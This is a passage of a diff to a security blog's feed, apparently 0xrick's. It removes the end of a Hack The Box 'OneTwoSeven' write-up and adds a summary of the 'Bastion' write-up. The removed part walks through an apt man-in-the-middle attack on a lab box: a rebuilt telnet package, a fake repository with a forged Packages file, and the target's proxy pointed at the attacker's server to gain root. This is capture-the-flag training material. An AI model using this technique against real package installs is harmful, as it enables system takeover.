-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# dpkg-deb -b extract/ telnet_0.17-42_amd64.deb
-dpkg-deb: building package 'telnet' in 'telnet_0.17-42_amd64.deb'.
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# ls -la
-total 156
-drwxr-xr-x 3 root root  4096 Aug 29 23:18 .
-drwxr-xr-x 3 root root  4096 Aug 29 23:16 ..
-drwxr-xr-x 4 root root  4096 Aug 29 23:12 extract
--rw-r--r-- 1 root root 72008 Nov 10  2016 telnet_0.17-41_amd64.deb
--rw-r--r-- 1 root root 72176 Aug 29 23:18 telnet_0.17-42_amd64.deb
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; What’s left is to create the repository, its name will be &lt;code class=&quot;highlighter-rouge&quot;&gt;devuan&lt;/code&gt; as we saw in the sources list :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list.d/onetwoseven.list 
-# OneTwoSeven special packages - not yet in use
-deb http://packages.onetwoseven.htb/devuan ascii main
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; The path for the package will be :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-42_amd64.deb
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; as we saw in the &lt;code class=&quot;highlighter-rouge&quot;&gt;apt-cache&lt;/code&gt; result :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-admin-data@onetwoseven:/$ apt-cache show telnet 
-Package: telnet
-Version: 0.17-41
-Installed-Size: 157
-Maintainer: Mats Erik Andersson &amp;lt;mats.andersson@gisladisker.se&amp;gt;
-Architecture: amd64
-Replaces: netstd
-Provides: telnet-client
-Depends: netbase, libc6 (&amp;gt;= 2.15), libstdc++6 (&amp;gt;= 5)
-Description: basic telnet client
-Description-md5: 80f238fa65c82c04a1590f2a062f47bb
-Source: netkit-telnet
-Tag: admin::login, interface::shell, network::client, protocol::ipv6,
- protocol::telnet, role::program, uitoolkit::ncurses, use::login
-Section: net
-Priority: standard
-Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
-Size: 72008
-MD5sum: 3409d7e40403699b890c68323e200874
-SHA256: 95aa315eb5b3be12fc7a91a8d7ee8eba7af99120641067ec39694200e034a5ae
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# mkdir devuan &amp;amp;&amp;amp; cd $_
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan# mkdir pool &amp;amp;&amp;amp; cd $_
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool# mkdir DEBIAN &amp;amp;&amp;amp; cd $_
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN# mkdir main &amp;amp;&amp;amp; cd $_
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main# mkdir n &amp;amp;&amp;amp; cd $_
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n# mkdir netkit-telnet
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n# cd netkit-telnet/
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# cp ../../../../../../telnet_0.17-42_amd64.deb .
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# ls -la
-total 80
-drwxr-xr-x 2 root root  4096 Aug 29 23:24 .
-drwxr-xr-x 3 root root  4096 Aug 29 23:23 ..
--rw-r--r-- 1 root root 72176 Aug 29 23:24 telnet_0.17-42_amd64.deb
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Now we need to create a &lt;code class=&quot;highlighter-rouge&quot;&gt;Packages&lt;/code&gt; file, we’ll copy the stuff from &lt;code class=&quot;highlighter-rouge&quot;&gt;apt-cache show telnet&lt;/code&gt; and change the version number, size and the hashes.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# ls -la
-total 80
-drwxr-xr-x 2 root root  4096 Aug 29 23:24 .
-drwxr-xr-x 3 root root  4096 Aug 29 23:23 ..
--rw-r--r-- 1 root root 72176 Aug 29 23:24 telnet_0.17-42_amd64.deb
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# md5sum telnet_0.17-42_amd64.deb                                                                                       
-2d29b3d5179226f9a772e370c1df05d9  telnet_0.17-42_amd64.deb
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# sha256sum telnet_0.17-42_amd64.deb 
-77e432f0017f8a1a035468a7fd02749a0e253aa61417fe801205d03fc41bdacd  telnet_0.17-42_amd64.deb
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Packages&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Package: telnet
-Version: 0.17-42
-Installed-Size: 157
-Maintainer: Mats Erik Andersson &amp;lt;mats.andersson@gisladisker.se&amp;gt;
-Architecture: amd64
-Replaces: netstd
-Provides: telnet-client
-Depends: netbase, libc6 (&amp;gt;= 2.15), libstdc++6 (&amp;gt;= 5)
-Description: basic telnet client
-Description-md5: 80f238fa65c82c04a1590f2a062f47bb
-Source: netkit-telnet
-Tag: admin::login, interface::shell, network::client, protocol::ipv6,
- protocol::telnet, role::program, uitoolkit::ncurses, use::login
-Section: net
-Priority: standard
-Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-42_amd64.deb
-Size: 72176
-MD5sum: 2d29b3d5179226f9a772e370c1df05d9
-SHA256: 77e432f0017f8a1a035468a7fd02749a0e253aa61417fe801205d03fc41bdacd
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Path for the &lt;code class=&quot;highlighter-rouge&quot;&gt;Packages&lt;/code&gt; file will be &lt;code class=&quot;highlighter-rouge&quot;&gt;dists/ascii/main/binary-amd64&lt;/code&gt;, we know it’s &lt;code class=&quot;highlighter-rouge&quot;&gt;ascii/main&lt;/code&gt; from the sources list :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list.d/onetwoseven.list 
-# OneTwoSeven special packages - not yet in use
-deb http://packages.onetwoseven.htb/devuan ascii main
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; And &lt;code class=&quot;highlighter-rouge&quot;&gt;binary-amd64&lt;/code&gt; because the package’s architecture is &lt;code class=&quot;highlighter-rouge&quot;&gt;amd-64&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan# mkdir dists &amp;amp;&amp;amp; cd $_
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists# mkdir ascii &amp;amp;&amp;amp; cd $_
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii# mkdir main &amp;amp;&amp;amp; cd $_
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii/main# mkdir binary-amd64 &amp;amp;&amp;amp; cd $_
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii/main/binary-amd64# cp ../../../../../Packages .
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii/main/binary-amd64# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; And that’s it for the repository.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan# tree
-.
-├── dists
-│   └── ascii
-│       └── main
-│           └── binary-amd64
-│               └── Packages
-└── pool
-    └── DEBIAN
-        └── main
-            └── n
-                └── netkit-telnet
-                    └── telnet_0.17-42_amd64.deb
-
-9 directories, 2 files
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; What’s left is to run a python &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; server in &lt;code class=&quot;highlighter-rouge&quot;&gt;~/Desktop/HTB/boxes/onetwoseven/apt-mitm/&lt;/code&gt; and everything is done.
-&lt;br /&gt; I exported the &lt;code class=&quot;highlighter-rouge&quot;&gt;http_proxy&lt;/code&gt; variable and I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get update&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-admin-data@onetwoseven:/$ export http_proxy=http://10.10.xx.xx:8181/
-www-admin-data@onetwoseven:/$ sudo apt-get update
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Then I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get upgrade&lt;/code&gt; :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/33.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/34.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; And we owned root !
-&lt;br /&gt; That’s it , Feedback is appreciated !
-&lt;br /&gt; Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;
-&lt;br /&gt; Thanks for reading.
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt; Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/unattended/&quot;&gt;Hack The Box - Unattended&lt;/a&gt;
-&lt;br /&gt; Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/bastion/&quot;&gt;Hack The Box - Bastion&lt;/a&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="rce" /><category term="php" /><category term="code-analysis" /><category term="networking" /><category term="ssh" /><summary type="html">Quick Summary Hey guys today OneTwoSeven retired and here’s my write-up about it. It was a very special box and I enjoyed every part of it, especially the apt man in the middle attack part. Definitely one of my favorite boxes. It’s a Linux box and its ip is 10.10.10.133, I added it to /etc/hosts as onetwoseven.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC onetwoseven.htb Only http on port 80 and ssh. Web Enumeration By going to http://onetwoseven.htb we see this nice website : There’s a sign-up button, and some other info : So now we know that sftp is running, and we also know that if we tried to bruteforce anything we’ll get banned. If we look at the navigation bar we can see 3 pages : Home is where we are, statistics just shows stuff like up-time, banned ip addresses etc.., there’s a page titled Admin and it’s disabled, let’s look at the html source : ```html &amp;lt;li class=&quot;nav-item&quot;&amp;gt;Admin&amp;lt;/li&amp;gt;</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/onetwoseven/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><category term="windows" /><category term="web" /><category term="ssh" /><category term="smb" /><category term="windows-exploitation" /><summary type="html">Quick Summary Hey guys today Bastion retired and here’s my write-up about it. It was a nice easy box, unlike most of the other boxes this one had no web service running and unlike most of the Windows boxes it had ssh. I wrote two write-ups for this box, this one solving it with Linux (Kali), Second one solving it with Windows (CommandoVM). It’s a Windows box and its ip is 10.10.10.134, I added it to /etc/hosts as bastion.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` Nmap 7.70 scan initiated Fri Sep 6 14:12:10 2019 as: nmap -sV -sT -sC -o nmapinitial bastion.htb Nmap scan report for bastion.htb (10.10.10.134) Host is up (0.41s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/bastion/0.png" /></entry></feed>
